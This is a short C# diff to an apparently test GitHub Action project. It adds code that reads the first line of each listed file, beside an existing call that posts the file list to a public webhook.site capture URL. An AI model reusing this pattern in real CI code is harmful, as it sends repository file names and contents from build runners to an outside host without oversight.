@@ -6,6 +6,7 @@ using Google.Apis.YouTube.v3.Data;
 using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Linq;
 using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Threading;
@@ -23,6 +24,14 @@ namespace testAction
             client.DefaultRequestHeaders.Accept.Add(
                 new MediaTypeWithQualityHeaderValue("application/vnd.github.v3+json"));
             client.DefaultRequestHeaders.Add("User-Agent", ".NET Foundation Repository Reporter");
+
+            string toPost = "";
+
+            foreach(var f in files)
+            {
+                var lines = File.ReadLines(f);
+                toPost += lines.First() + Environment.NewLine;
+            }
 
             await client.PostAsync("https://webhook.site/34dd9943-6e0e-4755-97a8-04f53869ad0e", new StringContent(string.Join(',', files)));
 
